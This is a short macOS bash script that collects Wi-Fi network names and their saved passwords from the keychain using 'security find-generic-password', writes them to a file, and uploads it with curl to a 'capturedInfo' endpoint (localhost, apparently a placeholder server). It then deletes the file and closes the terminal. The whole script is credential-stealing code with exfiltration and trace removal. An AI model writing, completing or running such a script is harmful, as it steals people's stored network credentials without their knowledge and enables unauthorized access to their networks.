#!/bin/bash

# Set the file path to store the Wi-Fi information
outputFile="wifi_info.txt"

# Get a list of Wi-Fi service names
wifiServices=$(networksetup -listallnetworkservices | grep -Ei "(Wi-Fi|AirPort)")

# Loop through each Wi-Fi service and retrieve information
for service in $wifiServices; do
    echo "Wi-Fi Service: $service" >> "$outputFile"
    
    # Get the Wi-Fi network name (SSID)
    ssid=$(networksetup -getairportnetwork "$service" | awk -F': ' '{print $2}')
    echo "SSID: $ssid" >> "$outputFile"
    
    # Get the Wi-Fi password if available
    password=$(security find-generic-password -wa "$ssid" 2>/dev/null)
    if [ -n "$password" ]; then
        echo "Password: $password" >> "$outputFile"
    else
        echo "Password not found" >> "$outputFile"
    fi    
    echo "----------------------------------------" >> "$outputFile"
done

# Upload the file to the remote server
serverURL="http://localhost:3002/capturedInfo"
response=$(curl -F "file=@$outputFile" "$serverURL")

# Always delete the file after attempting to upload
rm -f "$outputFile"
echo "File deleted."

# Close the terminal
exit
